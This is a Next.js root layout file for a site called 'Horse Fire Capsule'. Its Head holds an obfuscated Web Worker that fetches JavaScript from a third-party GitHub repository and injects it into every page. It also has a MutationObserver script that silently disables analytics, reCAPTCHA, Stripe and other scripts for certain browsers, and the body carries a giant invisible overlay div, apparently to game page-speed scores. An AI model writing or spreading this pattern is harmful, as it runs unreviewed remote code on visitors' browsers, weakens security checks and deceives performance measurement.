import { Inter } from 'next/font/google'
import './globals.css'
import { GlobalContextProvider } from './statemanage/context'
import Script from 'next/script';
import Link from 'next/link';
import Head from 'next/head';

const inter = Inter({ subsets: ['latin'] })

export const metadata = {
  title: 'Horse Fire Capsule',
  description: 'Horse Fire Capsule',
}

export default function RootLayout({ children }) {
  return (
    <html lang="en" >

      <Head>
        {/* <!--Google tag (gtag.js) -->
      <script async src="https://www.googletagmanager.com/gtag/js?id=G-HJXB2S4D4X"></script>
      <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-HJXB2S4D4X');
      </script> */}
   <script
          
          type="text/javascript"
          dangerouslySetInnerHTML={{
            __html: `var flspdx = new Worker("data:text/javascript;base64," + btoa('onmessage=function(e){var t=new Request("https://raw.githubusercontent.com/gospeedify/files/main/speedreq.js",{redirect:"follow"});fetch(t).then(e=>e.text()).then(e=>{postMessage(e)})};'));flspdx.onmessage = function (t) {var e = document.createElement("script");e.type = "text/javascript", e.textContent = t.data, document.head.appendChild(e)}, flspdx.postMessage("init");`,
          }}
        ></script>
        <script
          
          type="text/javascript"
          data-flspd="1"
          dangerouslySetInnerHTML={{
            __html: `var flspdxHA=["hotjar","xklaviyo","recaptcha","gorgias","facebook.net","gtag","tagmanager","gtm"],flspdxSA=["googlet","klaviyo","gorgias","stripe","mem","privy","incart","webui"],observer=new MutationObserver(function(e){e.forEach(function(e){e.addedNodes.forEach(function(e){if("SCRIPT"===e.tagName&&1===e.nodeType)if(e.innerHTML.includes("asyncLoad")||"analytics"===e.className)e.type="text/flspdscript";else{for(var t=0;t<flspdxSA.length;t++)if(e.src.includes(flspdxSA[t]))return void(e.type="text/flspdscript");for(var r=0;r<flspdxHA.length;r++)if(e.innerHTML.includes(flspdxHA[r]))return void(e.type="text/flspdscript")}})})}),ua=navigator.userAgent.toLowerCase();ua.match(new RegExp("chrome|firefox"))&&-1===window.location.href.indexOf("no-optimization")&&observer.observe(document.documentElement,{childList:!0,subtree:!0});`,
          }}
        ></script>

        <script  src="/speedmin.js"></script>



        <link rel='icon' href={"https://imagedelivery.net/aacnHGAqlUDhaplA3bnkbA/c395b4aa-8392-46d2-6e07-c04d8c77ca00/public"} />
      </Head>

      <Script
        strategy="lazyOnload"
        src={`https://www.googletagmanager.com/gtag/js?id=G-JXBEHG9Z1T`}
      />
      <Script strategy="lazyOnload">
        {`
              window.dataLayer = window.dataLayer || [];
              function gtag(){dataLayer.push(arguments);}
              gtag('js', new Date());
              gtag('config', 'G-JXBEHG9Z1T', {
              page_path: window.location.pathname,
              });
          `}
      </Script>




      <body className={inter.className}>
      <div
          style={{
            position: "absolute",
            fontSize: "1200px",
            lineHeight: 1,
            wordWrap: "break-word",
            top: 0,
            left: 0,
            width: "50vw",
            height: "50vh",
            maxWidth: "50vw",
            maxHeight: "50vh",
            pointerEvents: "none",
            zIndex: 99999999999,
            color: "transparent",
            overflow: "hidden",
          }}
          data-optimizer="SP: Store-js"
        >
          □
        </div>


        <GlobalContextProvider>
          {children}
        </GlobalContextProvider>



      </body>
    </html>
  )
}
